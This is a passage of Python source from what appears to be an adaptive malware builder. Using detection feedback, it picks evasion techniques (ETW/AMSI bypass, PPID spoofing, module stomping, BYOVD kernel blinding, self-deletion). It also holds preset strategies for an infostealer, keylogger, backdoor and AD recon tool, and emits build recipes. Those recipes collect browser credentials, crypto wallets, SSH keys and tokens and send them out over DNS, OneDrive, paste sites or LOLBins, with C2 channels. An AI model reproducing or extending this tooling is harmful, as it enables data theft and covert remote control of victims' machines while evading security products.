                if layer not in avoid_map:
                    avoid_map[layer] = set()
                avoid_map[layer].add(option)

    # Select best option for each layer (both universal + type-specific)
    for layer, info in all_layers.items():
        current = config.get(layer, info["default"])

        # If current is in avoid list, need to change
        if layer in avoid_map and current in avoid_map[layer]:
            selected = None
            if layer in prefer_map:
                for pref in prefer_map[layer]:
                    if pref in info["options"] and pref not in avoid_map.get(layer, set()):
                        selected = pref
                        break

            if not selected:
                risk_order = ["vlow", "low", "medium", "high"]
                for risk in risk_order:
                    for opt, opt_info in info["options"].items():
                        if opt_info["risk"] == risk and opt not in avoid_map.get(layer, set()):
                            selected = opt
                            break
                    if selected:
                        break

            if selected:
                config[layer] = selected

        elif detection_text and layer in prefer_map:
            for pref in prefer_map[layer]:
                if pref in info["options"] and pref not in avoid_map.get(layer, set()):
                    config[layer] = pref
                    break

    # Profile correlation: if full profiles were parsed, ensure selected
    # dimensions form a valid combination (boss-level multi-dim matching)
    if _valid_profiles:
        matches_any = any(
            all(config.get(k) == v for k, v in prof.items())
            for prof in _valid_profiles
        )
        if not matches_any:
            best = max(_valid_profiles, key=lambda p: sum(
                1 for k, v in p.items() if config.get(k) == v
            ))
            for k, v in best.items():
                config[k] = v

    # Without feedback, use strategy archetypes
    if not detection_text and not compile_error and run_index > 0:
        strategies = STRATEGY_ARCHETYPES.get(malware_type, STRATEGY_ARCHETYPES["infostealer"])
        idx = (run_index - 1) % len(strategies)
        strategy = strategies[idx]
        for layer, opt in strategy.items():
            layer_info = all_layers.get(layer)
            if layer_info and opt in layer_info["options"]:
                if opt not in avoid_map.get(layer, set()):
                    config[layer] = opt

    # Exploration: if config matches previous and we've failed multiple times,
    # perturb dimensions to break out of deterministic loops.
    # Prioritize boss dimensions (from detection text) over random dims.
    if previous_config and run_index >= 2:
        same = all(config.get(k) == previous_config.get(k) for k in all_layers)
        if same:
            import hashlib
            h = hashlib.md5(f"{run_index}:{detection_text[:200]}".encode()).hexdigest()
            boss_list = sorted(_boss_dims) if _boss_dims else []
            other_list = sorted(k for k in all_layers if k not in _boss_dims)
            dims_list = boss_list + other_list
            n_perturb = min(1 + run_index // 4, 5)
            for p in range(n_perturb):
                offset = int(h[p*2:p*2+2], 16)
                if p < len(boss_list):
                    dim = boss_list[p % len(boss_list)]
                else:
                    dim = dims_list[offset % len(dims_list)]
                opts = [o for o in all_layers[dim]["options"]
                        if o not in avoid_map.get(dim, set()) and o != config.get(dim)]
                if not opts:
                    opts = [o for o in all_layers[dim]["options"] if o != config.get(dim)]
                if opts:
                    pick = int(h[p*2+2:p*2+4], 16) if p*2+4 <= len(h) else offset
                    config[dim] = opts[pick % len(opts)]

    # Apply architectural constraints, but protect boss dims from override
    config = apply_constraints(config, malware_type, protected=_boss_dims)

    return config


# Strategy archetypes — each is a fundamentally different evasion approach.
# Ordered by success probability per type. Maximum behavioral variance between entries.
STRATEGY_ARCHETYPES = {
    "infostealer": [
        # S1: "Ghost" — minimal footprint, DNS drip-feed, behavioral pacing
        {
            "api_resolve": "api_hash_fnv1a", "execution": "callback_certenumsystem",
            "process": "ppid_spoof_sihost", "timing": "staged_jitter",
            "data_obfuscation": "stack_strings", "anti_analysis": "none",
            "exfil": "dns_txt", "persistence": "none",
            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
            "memory_residence": "native", "sleep_mode": "basic",
            "data_staging": "memory_only", "anti_forensics": "self_delete",
            "process_lifetime": "ephemeral_seconds",
            "collection_strategy": "bulk_immediate", "target_scope": "comprehensive",
        },
        # S2: "Cloud Parasite" — OneDrive exfil, no suspicious network, browser-only scope
        {
            "api_resolve": "peb_walk", "execution": "callback_abuse",
            "process": "ppid_spoof_svchost", "timing": "deferred",
            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_sandbox",
            "exfil": "cloud_onedrive", "persistence": "none",
            "etw_method": "patch", "stack_presentation": "honest",
            "memory_residence": "native", "sleep_mode": "basic",
            "data_staging": "temp_file", "anti_forensics": "self_delete",
            "process_lifetime": "ephemeral_seconds",
            "collection_strategy": "bulk_immediate", "target_scope": "browser_only",
        },
        # S3: "Slow Drip" — incremental collection, one source per launch, schtasks relaunch
        {
            "api_resolve": "indirect_syscall", "execution": "fiber",
            "process": "process_ghost", "timing": "triggered",
            "data_obfuscation": "xor_encrypt", "anti_analysis": "anti_debug",
            "exfil": "smb_write", "persistence": "none",
            "etw_method": "hwbp_etw", "stack_presentation": "ret_spoof",
            "memory_residence": "module_stomp", "sleep_mode": "basic",
            "data_staging": "ads", "anti_forensics": "timestomp",
            "process_lifetime": "ephemeral_staged",
            "collection_strategy": "incremental_slow", "target_scope": "credential_only",
        },
        # S4: "Update Check" — looks like software polling for updates
        {
            "api_resolve": "api_hash_djb2", "execution": "staged",
            "process": "ppid_spoof_runtimebroker", "timing": "workday",
            "data_obfuscation": "aes_encrypt", "anti_analysis": "none",
            "exfil": "https_post", "persistence": "none",
            "etw_method": "hwbp_both", "stack_presentation": "honest",
            "memory_residence": "native", "sleep_mode": "basic",
            "data_staging": "memory_only", "anti_forensics": "none",
            "process_lifetime": "medium_minutes",
            "collection_strategy": "bulk_immediate", "target_scope": "environment_recon",
        },
        # S5: "Clipboard Watcher" — clipboard-only, minimal footprint, paste exfil
        {
            "api_resolve": "api_hash_crc32", "execution": "callback_copyfile2",
            "process": "ppid_spoof_taskhostw", "timing": "deferred",
            "data_obfuscation": "stack_strings", "anti_analysis": "anti_sandbox",
            "exfil": "paste_site", "persistence": "none",
            "etw_method": "patch", "stack_presentation": "ret_spoof",
            "memory_residence": "native", "sleep_mode": "basic",
            "data_staging": "memory_only", "anti_forensics": "memory_only_full",
            "process_lifetime": "burst_and_die",
            "collection_strategy": "clipboard_watch", "target_scope": "clipboard_only",
        },
        # S6: "Native Host" — DLL sideloaded into legit app, cloud sync exfil
        {
            "api_resolve": "indirect_syscall", "execution": "staged",
            "process": "dll_sideload", "timing": "triggered",
            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_sandbox",
            "exfil": "cloud_onedrive", "persistence": "dll_search_order",
            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
            "memory_residence": "module_stomp", "sleep_mode": "ekko",
            "data_staging": "memory_only", "anti_forensics": "blend_noise",
            "process_lifetime": "medium_minutes",
            "collection_strategy": "event_triggered", "target_scope": "session_tokens",
        },
        # S7: "COM Server" — COM in-proc, steganography exfil, runs in dllhost.exe
        {
            "api_resolve": "peb_walk", "execution": "callback_enumrestype",
            "process": "com_object", "timing": "workday",
            "data_obfuscation": "stack_strings", "anti_analysis": "canary_aware",
            "exfil": "steganography", "persistence": "com_hijack",
            "etw_method": "hwbp_etw", "stack_presentation": "ret_spoof",
            "memory_residence": "native", "sleep_mode": "encrypt",
            "data_staging": "browser_storage", "anti_forensics": "memory_only_full",
            "process_lifetime": "medium_minutes",
            "collection_strategy": "piggyback_legit", "target_scope": "file_targeted",
        },
        # S8: "Kernel Blind" — BYOVD total EDR blind, then standard exfil (escalation-only)
        {
            "api_resolve": "indirect_syscall", "execution": "staged",
            "process": "ppid_spoof_svchost", "timing": "deferred",
            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_sandbox",
            "exfil": "https_post", "persistence": "none",
            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
            "memory_residence": "native", "sleep_mode": "basic",
            "data_staging": "memory_only", "anti_forensics": "self_delete",
            "process_lifetime": "ephemeral_seconds",
            "collection_strategy": "bulk_immediate", "target_scope": "comprehensive",
            "kernel_evasion": "byovd_dbutil", "callback_evasion": "total_blind",
            "process_protection": "none", "etw_kernel": "dkom_provider",
        },
    ],
    "keylogger": [
        # S1: "Game Input" — DirectInput capture, looks like a game, DNS exfil
        {
            "api_resolve": "api_hash_fnv1a", "execution": "callback_enumwindows",
            "process": "ppid_spoof_sihost", "timing": "staged_jitter",
            "data_obfuscation": "stack_strings", "anti_analysis": "none",
            "exfil": "dns_txt", "persistence": "registry_run",
            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
            "memory_residence": "native", "sleep_mode": "ekko",
            "data_staging": "memory_only", "anti_forensics": "none",
            "process_lifetime": "persistent",
            "capture_method": "directinput", "capture_tempo": "foreground_app",
        },
        # S2: "Accessibility Tool" — UI Automation, looks like screen reader
        {
            "api_resolve": "peb_walk", "execution": "callback_abuse",
            "process": "ppid_spoof_svchost", "timing": "workday",
            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_sandbox",
            "exfil": "cloud_onedrive", "persistence": "com_hijack",
            "etw_method": "patch", "stack_presentation": "honest",
            "memory_residence": "native", "sleep_mode": "encrypt",
            "data_staging": "temp_file", "anti_forensics": "self_delete",
            "process_lifetime": "persistent",
            "capture_method": "ui_automation", "capture_tempo": "business_hours",
        },
        # S3: "Clipboard Sniper" — clipboard only, banking trojan model
        {
            "api_resolve": "api_hash_djb2", "execution": "callback_certenumsystem",
            "process": "ppid_spoof_runtimebroker", "timing": "triggered",
            "data_obfuscation": "xor_encrypt", "anti_analysis": "anti_debug",
            "exfil": "https_post", "persistence": "startup_folder",
            "etw_method": "hwbp_etw", "stack_presentation": "ret_spoof",
            "memory_residence": "module_stomp", "sleep_mode": "jitter",
            "data_staging": "memory_only", "anti_forensics": "memory_only_full",
            "process_lifetime": "persistent",
            "capture_method": "clipboard_monitor", "capture_tempo": "url_specific",
        },
        # S4: "Low Poll" — GetAsyncKeyState, minimal footprint, SMB local exfil
        {
            "api_resolve": "indirect_syscall", "execution": "fiber",
            "process": "process_ghost", "timing": "deferred",
            "data_obfuscation": "aes_encrypt", "anti_analysis": "none",
            "exfil": "smb_write", "persistence": "registry_run",
            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
            "memory_residence": "native", "sleep_mode": "ekko",
            "data_staging": "registry", "anti_forensics": "timestomp",
            "process_lifetime": "persistent",
            "capture_method": "getasynckeystate", "capture_tempo": "human_paced",
        },
        # S5: "Raw HID" — Raw Input API, named pipe split, burst exfil on idle
        {
            "api_resolve": "api_hash_crc32", "execution": "apc_self",
            "process": "ppid_spoof_taskhostw", "timing": "staged_jitter",
            "data_obfuscation": "stack_strings", "anti_analysis": "anti_sandbox",
            "exfil": "named_pipe", "persistence": "scheduled_task",
            "etw_method": "patch", "stack_presentation": "honest",
            "memory_residence": "native", "sleep_mode": "encrypt",
            "data_staging": "shared_memory", "anti_forensics": "none",
            "process_lifetime": "persistent",
            "capture_method": "raw_input", "capture_tempo": "continuous",
        },
        # S6: "Shell Extension" — explorer.exe hosts the DLL, cloud exfil is natural
        {
            "api_resolve": "indirect_syscall", "execution": "callback_abuse",
            "process": "shell_extension", "timing": "triggered",
            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_sandbox",
            "exfil": "cloud_onedrive", "persistence": "dll_search_order",
            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
            "memory_residence": "module_stomp", "sleep_mode": "ekko",
            "data_staging": "browser_storage", "anti_forensics": "blend_noise",
            "process_lifetime": "persistent",
            "capture_method": "winevent_hook", "capture_tempo": "foreground_app",
        },
        # S7: "Browser Plugin" — browser extension, HTTPS exfil is native
        {
            "api_resolve": "peb_walk", "execution": "staged",
            "process": "browser_extension", "timing": "workday",
            "data_obfuscation": "stack_strings", "anti_analysis": "canary_aware",
            "exfil": "https_post", "persistence": "none",
            "etw_method": "hwbp_etw", "stack_presentation": "ret_spoof",
            "memory_residence": "native", "sleep_mode": "encrypt",
            "data_staging": "memory_only", "anti_forensics": "memory_only_full",
            "process_lifetime": "persistent",
            "capture_method": "etw_consumer", "capture_tempo": "url_specific",
        },
    ],
    "backdoor": [
        # S1: "Dead Drop Cloud" — OneDrive C2, in-process API, COM hijack persist
        {
            "api_resolve": "api_hash_fnv1a", "execution": "callback_abuse",
            "process": "ppid_spoof_svchost", "timing": "staged_jitter",
            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_sandbox",
            "exfil": "winhttp_api", "persistence": "com_hijack",
            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
            "memory_residence": "native", "sleep_mode": "ekko",
            "data_staging": "memory_only", "anti_forensics": "none",
            "process_lifetime": "persistent",
            "c2_paradigm": "dead_drop_cloud", "cmd_execution": "in_process",
            "stage_architecture": "monolithic",
        },
        # S2: "Named Pipe Ghost" — triggered pipe C2, zero outbound, disposable
        {
            "api_resolve": "peb_walk", "execution": "callback_certenumsystem",
            "process": "ppid_spoof_dllhost", "timing": "workday",
            "data_obfuscation": "stack_strings", "anti_analysis": "none",
            "exfil": "dns_txt", "persistence": "scheduled_task",
            "etw_method": "hwbp_etw", "stack_presentation": "ret_spoof",
            "memory_residence": "module_stomp", "sleep_mode": "encrypt",
            "data_staging": "shared_memory", "anti_forensics": "self_delete",
            "process_lifetime": "persistent",
            "c2_paradigm": "triggered_pipe", "cmd_execution": "in_process",
            "stage_architecture": "disposable",
        },
        # S3: "DNS Shadow" — DNS-only C2, ghost process, indirect syscalls
        {
            "api_resolve": "indirect_syscall", "execution": "fiber",
            "process": "process_ghost", "timing": "triggered",
            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_debug",
            "exfil": "https_post", "persistence": "wmi_subscription",
            "etw_method": "hwbp_both", "stack_presentation": "honest",
            "memory_residence": "native", "sleep_mode": "ekko",
            "data_staging": "memory_only", "anti_forensics": "memory_only_full",
            "process_lifetime": "medium_minutes",
            "c2_paradigm": "dead_drop_dns", "cmd_execution": "wmi_exec",
            "stage_architecture": "modular_plugins",
        },
        # S4: "Service Beacon" — HTTP beacon, service DLL, looks like Windows service
        {
            "api_resolve": "api_hash_djb2", "execution": "callback_enumwindows",
            "process": "service_dll", "timing": "deferred",
            "data_obfuscation": "xor_encrypt", "anti_analysis": "anti_sandbox",
            "exfil": "smb_write", "persistence": "service",
            "etw_method": "patch", "stack_presentation": "ret_spoof",
            "memory_residence": "native", "sleep_mode": "jitter",
            "data_staging": "registry", "anti_forensics": "timestomp",
            "process_lifetime": "persistent",
            "c2_paradigm": "active_beacon", "cmd_execution": "schtasks_exec",
            "stage_architecture": "monolithic",
        },
        # S5: "Triggered File" — dormant until file appears, burst exec, self-destruct
        {
            "api_resolve": "api_hash_crc32", "execution": "staged",
            "process": "ppid_spoof_taskhostw", "timing": "staged_jitter",
            "data_obfuscation": "stack_strings", "anti_analysis": "none",
            "exfil": "tcp_direct", "persistence": "dll_search_order",
            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
            "memory_residence": "module_stomp", "sleep_mode": "ekko",
            "data_staging": "memory_only", "anti_forensics": "self_delete",
            "process_lifetime": "ephemeral_seconds",
            "c2_paradigm": "triggered_file", "cmd_execution": "in_process",
            "stage_architecture": "cooperative_multi",
        },
        # S6: "COM Server" — COM in-proc, HTTP exfil looks native from dllhost
        {
            "api_resolve": "indirect_syscall", "execution": "callback_abuse",
            "process": "com_object", "timing": "workday",
            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_sandbox",
            "exfil": "https_post", "persistence": "com_hijack",
            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
            "memory_residence": "module_stomp", "sleep_mode": "ekko",
            "data_staging": "memory_only", "anti_forensics": "blend_noise",
            "process_lifetime": "persistent",
            "c2_paradigm": "legit_service_poll", "cmd_execution": "com_exec",
            "stage_architecture": "modular_plugins",
        },
        # S7: "DLL Sideload" — sideloaded into signed app, cloud C2
        {
            "api_resolve": "peb_walk", "execution": "fiber",
            "process": "dll_sideload", "timing": "triggered",
            "data_obfuscation": "stack_strings", "anti_analysis": "canary_aware",
            "exfil": "cloud_onedrive", "persistence": "dll_search_order",
            "etw_method": "hwbp_etw", "stack_presentation": "ret_spoof",
            "memory_residence": "native", "sleep_mode": "encrypt",
            "data_staging": "browser_storage", "anti_forensics": "memory_only_full",
            "process_lifetime": "medium_minutes",
            "c2_paradigm": "dead_drop_cloud", "cmd_execution": "in_process",
            "stage_architecture": "staged_loader",
        },
        # S8: "Kernel Dominator" — BYOVD total blind, full C2 control (escalation-only)
        {
            "api_resolve": "indirect_syscall", "execution": "callback_abuse",
            "process": "service_dll", "timing": "deferred",
            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_sandbox",
            "exfil": "https_post", "persistence": "service",
            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
            "memory_residence": "module_stomp", "sleep_mode": "ekko",
            "data_staging": "memory_only", "anti_forensics": "blend_noise",
            "process_lifetime": "persistent",
            "c2_paradigm": "dead_drop_cloud", "cmd_execution": "in_process",
            "stage_architecture": "modular_plugins",
            "kernel_evasion": "byovd_dbutil", "callback_evasion": "total_blind",
            "process_protection": "hide_process", "etw_kernel": "dkom_provider",
        },
    ],
    "ad_recon": [
        # S1: "LDAP Ghost" — DNS exfil, patchless, looks like AD query tool
        {
            "api_resolve": "api_hash_fnv1a", "execution": "callback_abuse",
            "process": "ppid_spoof_svchost", "timing": "staged_jitter",
            "data_obfuscation": "stack_strings", "anti_analysis": "none",
            "exfil": "dns_txt", "persistence": "none",
            "etw_method": "hwbp_both", "stack_presentation": "ret_spoof",
            "memory_residence": "native", "sleep_mode": "basic",
        },
        # S2: "IT Admin Tool" — SMB, workday timing, looks like management script
        {
            "api_resolve": "peb_walk", "execution": "staged",
            "process": "ppid_spoof_dllhost", "timing": "workday",
            "data_obfuscation": "aes_encrypt", "anti_analysis": "anti_sandbox",
            "exfil": "smb_write", "persistence": "none",
            "etw_method": "patch", "stack_presentation": "honest",
            "memory_residence": "native", "sleep_mode": "basic",
        },
        # S3: "HTTPS Report" — exfils via HTTPS, deferred start
        {
            "api_resolve": "api_hash_djb2", "execution": "callback_certenumsystem",
            "process": "ppid_spoof_runtimebroker", "timing": "deferred",
            "data_obfuscation": "xor_encrypt", "anti_analysis": "anti_debug",
            "exfil": "https_post", "persistence": "none",
            "etw_method": "hwbp_etw", "stack_presentation": "ret_spoof",
            "memory_residence": "native", "sleep_mode": "basic",
        },
        # S4: "WinHTTP Blend" — ghost process, looks like update check
        {
            "api_resolve": "indirect_syscall", "execution": "fiber",
            "process": "process_ghost", "timing": "triggered",
            "data_obfuscation": "aes_encrypt", "anti_analysis": "none",
            "exfil": "winhttp_api", "persistence": "none",
            "etw_method": "hwbp_both", "stack_presentation": "honest",
            "memory_residence": "module_stomp", "sleep_mode": "basic",
        },
        # S5: "HTTP Sprint" — fast HTTP exfil, CRC32, callback
        {
            "api_resolve": "api_hash_crc32", "execution": "callback_copyfile2",
            "process": "ppid_spoof_taskhostw", "timing": "staged_jitter",
            "data_obfuscation": "stack_strings", "anti_analysis": "anti_sandbox",
            "exfil": "http_post", "persistence": "none",
            "etw_method": "patch", "stack_presentation": "ret_spoof",
            "memory_residence": "native", "sleep_mode": "basic",
        },
    ],
}


def record_run(config, detected, detection_text="", success=False):
    """Record a run result for future adaptation."""
    history = load_history()
    history["runs"].append({
        "config": config,
        "detected": detected,
        "detection_text": detection_text,
        "success": success,
    })
    if success:
        history["successes"].append(config)
    if detected:
        history["detections"].append({"config": config, "text": detection_text})

    # Keep last 50 runs
    history["runs"] = history["runs"][-50:]
    history["successes"] = history["successes"][-20:]
    history["detections"] = history["detections"][-20:]
    save_history(history)


def config_to_recipe(config, malware_type="infostealer", collectors=None):
    """Convert a layer config to a recipe YAML string."""
    is_ad_recon = malware_type == "ad_recon"

    # Keylogger capture method → collector chunk (defined early so keylogger collector selection can use it)
    capture_map = {
        "hook_ll":           "collectors/keylogger",
        "getasynckeystate":  "collectors/keylogger_poll",
        "raw_input":         "collectors/keylogger_rawinput",
        "directinput":       "collectors/keylogger_directinput",
        "ui_automation":     "collectors/keylogger_uiautomation",
        "clipboard_monitor": "collectors/keylogger_clipboard",
        "etw_consumer":      "collectors/keylogger_poll",
        "ime_hijack":        "collectors/keylogger_poll",
        "getkeybstate":      "collectors/keylogger_poll",
        "screen_ocr":        "collectors/keylogger_poll",
        "winevent_hook":     "collectors/keylogger_poll",
        "msg_hook":          "collectors/keylogger",
    }

    if collectors is None:
        if malware_type == "infostealer":
            collectors = [
                "collectors/system_info",
                "collectors/processes",
                "collectors/browser_chromium",
                "collectors/screenshot",
                "collectors/env_vars",
                "collectors/netinfo_api",
                "collectors/installed_software",
                "collectors/recent_files",
                "collectors/cloud_creds",
                "collectors/crypto_wallets",
                "collectors/ssh_keys",
                "collectors/discord_tokens",
                "collectors/ftp_credentials",
                "collectors/startup_items",
                "collectors/security_products",
                "collectors/drives",
                "collectors/scheduled_tasks_recon",
                "collectors/clipboard",
                "collectors/active_windows",
                "collectors/telegram_session",
            ]
        elif malware_type == "keylogger":
            capture = config.get("capture_method", "getasynckeystate")
            kl_chunk = capture_map.get(capture, "collectors/keylogger_poll")
            if not (CHUNKS_DIR / f"{kl_chunk}.c").exists():
                kl_chunk = "collectors/keylogger_poll"
            collectors = [kl_chunk, "collectors/clipboard"]
        elif malware_type == "backdoor":
            collectors = None
        elif malware_type == "ad_recon":
            collectors = [
                "ad_collectors/ad_users",
                "ad_collectors/ad_groups",
                "ad_collectors/ad_computers",
                "ad_collectors/ad_ous",
                "ad_collectors/ad_gpos",
            ]
        else:
            collectors = ["collectors/system_info"]

    # Map layer selections to chunk paths
    arch_map = {
        "sequential": "arch/sequential",
        "threaded": "arch/threaded",
        "staged": "arch/staged",
        "fiber": "arch/fiber",
        "callback_abuse": "arch/callback_abuse",
        "callback_enumwindows": "arch/callback_enumwindows",
        "callback_certenumsystem": "arch/callback_certenumsystem",
        "callback_copyfile2": "arch/callback_copyfile2",
        "callback_enumrestype": "arch/callback_enumrestype",
        "apc_self": "arch/apc_self",
    }

    exfil_map = {
        "tcp_direct":        "exfil/tcp_direct",
        "http_post":         "exfil/http_post",
        "https_post":        "exfil/https_post",
        "winhttp_get":       "exfil/winhttp_get",
        "winhttp_api":       "exfil/winhttp_api",
        "dns_exfil":         "exfil/dns_exfil",
        "dns_txt":           "exfil/dns_txt",
        "smb_write":         "exfil/smb_write",
        "http_get_chunks":   "exfil/http_get_chunks",
        "named_pipe":        "exfil/named_pipe",
        "certutil_lolbin":   "exfil/certutil_lolbin",
        "bitsadmin_lolbin":  "exfil/bitsadmin_lolbin",
        "powershell_lolbin": "exfil/powershell_lolbin",
        "cscript_lolbin":    "exfil/cscript_lolbin",
        "mshta_lolbin":      "exfil/mshta_lolbin",
        "curl_lolbin":       "exfil/curl_lolbin",
        "cloud_onedrive":    "exfil/cloud_onedrive",
        "cloud_gdrive":      "exfil/cloud_gdrive",
        "email_mapi":        "exfil/email_mapi",
        "paste_site":        "exfil/paste_site",
        "dead_drop":         "exfil/cloud_onedrive",
        "dead_drop_cloud":   "exfil/cloud_onedrive",
        "browser_post":      "exfil/https_post",
        "steganography":     "exfil/https_post",
    }

    # Keylogger needs exfil chunks that provide flush_to_c2()
    keylogger_exfil_map = {
        "tcp_direct":        "exfil/tcp_flush",
        "dns_exfil":         "exfil/dns_flush",
        "dns_txt":           "exfil/dns_flush",
        "http_post":         "exfil/winhttp_api",
        "https_post":        "exfil/winhttp_api",
        "winhttp_get":       "exfil/winhttp_api",
        "winhttp_api":       "exfil/winhttp_api",
    }

    # Backdoor C2 paradigm → C2 transport chunk
    c2_paradigm_map = {
        "active_beacon":     "c2/tcp_beacon",
        "passive_listener":  "c2/tcp_beacon",
        "dead_drop_cloud":   "c2/dead_drop_cloud",
        "dead_drop_dns":     "c2/dns_c2",
        "triggered_file":    "c2/tcp_beacon",
        "triggered_pipe":    "c2/triggered_pipe",
        "email_c2":          "c2/winhttp_beacon",
        "legit_service_poll":"c2/winhttp_beacon",
        "p2p_mesh":          "c2/tcp_beacon",
        "domain_front":      "c2/winhttp_beacon",
        "serverless_c2":     "c2/winhttp_beacon",
        "websocket":         "c2/winhttp_beacon",
    }

    # Persistence → chunk mapping (expanded)
    persist_map = {
        "registry_run":      "persist/registry_run",
        "scheduled_task":    "persist/scheduled_task",
        "startup_folder":    "persist/startup_folder",
        "service":           "persist/registry_run",
        "com_hijack":        "persist/com_hijack",
        "dll_search_order":  "persist/dll_search_order",
        "ifeo_debugger":     "persist/ifeo_debugger",
        "print_monitor_persist": "persist/registry_run",
        "network_provider":  "persist/registry_run",
        "wmi_subscription":  "persist/wmi_subscription",
        "accessibility_replace": "persist/registry_run",
    }

    timing_map = {
        "deferred": "evasion/deferred_exec",
        "triggered": "evasion/triggered_exec",
        "workday": "evasion/triggered_exec",
    }

    obfuscation_map = {
        "xor_encrypt": "evasion/aes_encrypt",
        "stack_strings": "evasion/stack_strings",
        "aes_encrypt": "evasion/aes_encrypt",
    }

    evasion_chunks = []
    obf = config.get("data_obfuscation", "plaintext")
    if obf != "plaintext" and obf in obfuscation_map:
        evasion_chunks.append(obfuscation_map[obf])
    if config.get("anti_analysis", "none") == "full":
        evasion_chunks.extend(["evasion/anti_debug", "evasion/anti_vm", "evasion/anti_sandbox"])
    elif config.get("anti_analysis", "none") != "none":
        evasion_chunks.append(f"evasion/{config['anti_analysis']}")
    timing = config.get("timing", "immediate")
    if timing not in ("immediate", "staged_jitter") and timing in timing_map:
        evasion_chunks.append(timing_map[timing])

    api_resolve_key = config.get("api_resolve", "direct_import")
    process_key = config.get("process", "standalone")
    persist_key = config.get("persistence", "none")

    # Map api_resolve options to actual chunk paths
    api_resolve_map = {
        "api_hash_djb2":    "api_resolve/api_hash_djb2",
        "api_hash_crc32":   "api_resolve/api_hash_djb2",
        "api_hash_fnv1a":   "api_resolve/api_hash_fnv1a",
        "peb_walk":         "api_resolve/peb_walk",
        "indirect_syscall": "evasion/indirect_syscall",
    }

    # Map process options to actual chunk paths
    process_map = {
        "ppid_spoof":              "process/ppid_spoof",
        "ppid_spoof_svchost":      "process/ppid_spoof_svchost",
        "ppid_spoof_runtimebroker": "process/ppid_spoof_runtimebroker",
        "ppid_spoof_sihost":       "process/ppid_spoof_sihost",
        "ppid_spoof_taskhostw":    "process/ppid_spoof_taskhostw",
        "ppid_spoof_dllhost":      "process/ppid_spoof_dllhost",
        "dll_sideload":   "process/ppid_spoof",
        "process_hollow": "process/ppid_spoof",
        "process_ghost":  "process/process_ghost",
        "com_object":     "process/com_object",
        "service_dll":    "process/service_dll",
        "wmi_consumer":   "process/ppid_spoof_svchost",
        "shell_extension": "process/ppid_spoof",
        "print_monitor":  "process/ppid_spoof_svchost",
        "browser_extension": "process/ppid_spoof",
        "lsa_plugin":     "process/ppid_spoof_svchost",
    }

    if is_ad_recon:
        lines = [
            f"name: {malware_type}_adaptive",
            f"description: Adaptive AD recon — layers selected by evasion_selector",
            "",
            "core:",
            "  - ad/json_builder",
            "  - ad/ldap_client",
            "  - ad/sid_resolver",
            "  - ad_collectors/ad_domains",
            "",
        ]
        lines.append("collectors:")
        for c in collectors:
            lines.append(f"  - {c}")
        lines.extend(["", "arch: arch/ad_recon"])
    else:
        lines = [
            f"name: {malware_type}_adaptive",
            f"description: Adaptive {malware_type} — layers selected by evasion_selector",
            "",
            "core:",
            "  - core/emit_buffer",
            "  - core/run_cmd",
            "  - core/file_ops",
            "",
        ]

    if malware_type == "backdoor":
        c2_para = config.get("c2_paradigm", "active_beacon")
        c2_chunk = c2_paradigm_map.get(c2_para, "c2/tcp_beacon")
        if not (CHUNKS_DIR / f"{c2_chunk}.c").exists():
            c2_chunk = "c2/winhttp_beacon" if "http" in config.get("exfil", "") else "c2/tcp_beacon"
        lines.append(f"c2: {c2_chunk}")
        lines.append("")
        lines.append("commands:")
        lines.append("  - commands/cmd_sysinfo")
        lines.append("  - commands/cmd_processes")
        lines.append("  - commands/cmd_filelist")
        lines.append("  - commands/cmd_fileread")
        lines.append("  - commands/cmd_filewrite")
        lines.append("  - commands/cmd_screenshot")
        lines.append("  - commands/cmd_registry")
        lines.append("  - commands/cmd_netinfo")
        lines.append("  - commands/cmd_exec")
        lines.append("  - commands/cmd_exec_powershell")
        lines.append("")
        lines.append("arch: arch/backdoor")
    elif not is_ad_recon:
        lines.append("collectors:")
        for c in collectors:
            lines.append(f"  - {c}")
        lines.extend([
            "",
            f"exfil: {(keylogger_exfil_map if malware_type == 'keylogger' else exfil_map).get(config.get('exfil', 'tcp_direct'), exfil_map.get(config.get('exfil', 'tcp_direct'), 'exfil/tcp_direct'))}",
            f"arch: {arch_map.get(config.get('execution', 'sequential'), 'arch/sequential')}",
        ])

    # Only add api_resolve if the actual chunk file exists
    if api_resolve_key not in ("direct_import", "loadlibrary"):
        chunk_path = api_resolve_map.get(api_resolve_key, f"api_resolve/{api_resolve_key}")
        if api_resolve_key == "indirect_syscall":
            evasion_chunks.append(chunk_path)
        elif (CHUNKS_DIR / f"{chunk_path}.c").exists():
            lines.append(f"api_resolve: {chunk_path}")

    # Only add process chunk if it actually exists
    if process_key != "standalone":
        chunk_path = process_map.get(process_key, f"process/{process_key}")
        if (CHUNKS_DIR / f"{chunk_path}.c").exists():
            lines.append(f"process: {chunk_path}")

    # ETW/AMSI bypass method
    etw = config.get("etw_method", "patch")
    if etw == "patch":
        evasion_chunks.append("evasion/etw_patch")
    elif etw == "hwbp_etw":
        evasion_chunks.append("evasion/hw_bp_etw")
    elif etw == "hwbp_both":
        evasion_chunks.append("evasion/hw_bp_etw")
        evasion_chunks.append("evasion/amsi_hwbp")

    # Memory residence
    if config.get("memory_residence") == "module_stomp":
        evasion_chunks.append("evasion/module_stomp")

    # Stack presentation
    if config.get("stack_presentation") == "ret_spoof":
        evasion_chunks.append("evasion/ret_spoof")

    # Sleep mode (for persistent payloads)
    sleep = config.get("sleep_mode", "basic")
    if sleep == "jitter":
        evasion_chunks.append("evasion/sleep_jitter")
    elif sleep == "encrypt":
        evasion_chunks.append("evasion/sleep_encrypt")
    elif sleep == "ekko":
        evasion_chunks.append("evasion/sleep_ekko")

    # Anti-forensics chunk
    af = config.get("anti_forensics", "none")
    af_map = {
